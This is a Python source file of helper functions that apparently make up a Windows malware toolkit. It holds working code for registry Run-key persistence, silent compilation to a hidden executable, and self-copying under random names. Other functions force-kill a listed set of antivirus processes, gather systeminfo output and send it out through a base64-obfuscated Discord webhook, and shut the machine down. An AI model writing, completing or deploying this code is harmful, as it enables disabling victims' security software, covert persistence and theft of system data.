import winreg
import getpass
from datetime import datetime
import subprocess
import os
import sys
import shutil
import random
import base64
from discord import SyncWebhook, File
from io import StringIO

def abs_path():
    """Func that returns abs path of cur file"""
    return os.path.abspath(__file__)

def basename():
    """Func that returns basename of file"""
    return os.path.basename(__file__)

def get_user():
    """Func that gets the username of the current user."""
    return getpass.getuser()

def time():
    """Func that returns the current system time as a formatted string. Format: YYYY-MM-DD HH:MM:SS"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def add_auto_run(script_name,reg_key_name):
    """Func that adds the script to the Windows Registry for autorun on startup.
    takes nonabs path of script as arg 1, and name of key for arg 2"""
    #get name of abs file path
    file_path = os.path.abspath(script_name)
    #get the reg hive for user, path, and start reg key creation
    key = winreg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_SET_VALUE)
    #takes the desired regkey name from 2nd arg, then closes
    winreg.SetValueEx(reg_key, reg_key_name, 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(reg_key)
    
def convert_to_exe(py_file):
    """Func that converts a .py file (py_file) to .exe using pyinstaller, no windows are made during compilation"""
    try:
        #run pyinstaller using subprocces.run, tells subproccess and pyinstaller to not make windows
        subprocess.run(
            [
                "pyinstaller",
                "--onefile",  
                "--noconsole",
                py_file
            ],
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        #builds the exe path from the usual dist folder and moves to py file's og location
        exe_name = os.path.splitext(os.path.basename(py_file))[0] + ".exe"
        dist_path = os.path.join("dist", exe_name)
        shutil.move(dist_path, os.path.dirname(py_file))
    except Exception as e:
        print(f"Error converting {py_file} to .exe: {e}")

def run_exe(file_path):
    """Func that runs the exe of a file, takes the file path as arg, no windows"""
    try:
        subprocess.run([file_path],creationflags=subprocess.CREATE_NO_WINDOW)
        print(f"Successfully ran {file_path}")
    except Exception as e:
        print(f"Error running {file_path}: {e}")

def dupe_file(amount):
    """Func to duplicate files and give 777 perms to new file, returns list of copies"""
    created_files = []
    if getattr(sys, 'frozen', False):
        script_path = sys.executable  
    else:
        script_path = __file__  

    for i in range(amount):
        new_file_name = str(random.randint(1, 10000)) + ".py"
        new_file_path = os.path.abspath(new_file_name)
        shutil.copy(script_path, new_file_path)
        os.chmod(new_file_path, 0o777)
        created_files.append(new_file_path)
    return created_files

def shutdown():
    """Func that simply shuts the system down"""
    subprocess.run("shutdown /s")

def sys_info():
    """Func that gathers the system information and returns the string"""
    info=subprocess.run('systeminfo',capture_output=True,text=True)
    return info.stdout
    
def decode_webhook(encoded_url):
    """Func that decodes the webhook url (encoded_url) from base64 to utf-8, takes encoded url as arg, returns decoded url"""
    decoded_bytes = base64.b64decode(encoded_url)
    decoded_url = decoded_bytes.decode('utf-8')
    return decoded_url

def send_webhook(webhook,message):
    """Func that takes a base64 encoded webhook (webhook) and a message (message) to send as args, decodes, and sends to hook
    try/exc designed to write to a txt if sending fails to maintain logging"""
    webhook = SyncWebhook.from_url(decode_webhook(webhook)) 
    try: 
        webhook.send(message)
    except Exception:
        if not os.path.exists("log.txt"):
            with open("log.txt", "w") as log_file:
                log_file.write(message)
        else:
            with open("log.txt", "a") as log_file:
                log_file.write(message)
        try:
            file_obj = StringIO(message)
            file_obj.name = "log.txt" 
            webhook.send(file=File(file_obj,filename='log.txt'))
        except Exception:
            print(Exception)

def kill_antivirus():
    """Func that kills proccesses of anti viruses (avs)"""
    #List of common avs
    common_av=[
    # Windows Defender
    "MsMpEng.exe",

    # Avast
    "AvastUI.exe",
    "AvastSvc.exe",

    # AVG
    "AVGUI.exe",
    "AVGSvc.exe",

    # Bitdefender
    "bdagent.exe",
    "vsserv.exe",
    "bdservicehost.exe",

    # Kaspersky
    "avp.exe",

    # McAfee
    "mcshield.exe",
    "masvc.exe",
    "mfemms.exe",

    # Norton / Symantec
    "ns.exe",
    "ccSvcHst.exe",

    # ESET NOD32
    "egui.exe",
    "ekrn.exe",

    # Sophos
    "SophosUI.exe",
    "SophosFS.exe",
    "SophosHealth.exe",

    # Trend Micro
    "UfSeAgnt.exe",
    "Ntrtscan.exe",

    # Malwarebytes
    "MBAMService.exe",
    "mbamtray.exe",

    # Panda Dome
    "PSANHost.exe",
    "PandaSecurityTb.exe",

    # Webroot
    "WRSA.exe"
]
    #loop to iterate and kill the proccesses using cmd prompt
    for av in common_av:
        cmd=f"taskkill /IM {av}"
        subprocess.run(cmd,creationflags=subprocess.CREATE_NO_WINDOW)

def install_dependencies(pip_package):
    """Func that installs a needed pip package for a given script
    Para 'pip_package' is the desired pip package it install"""
    subprocess.check_call([sys.executable,'-m','pip','install', pip_package])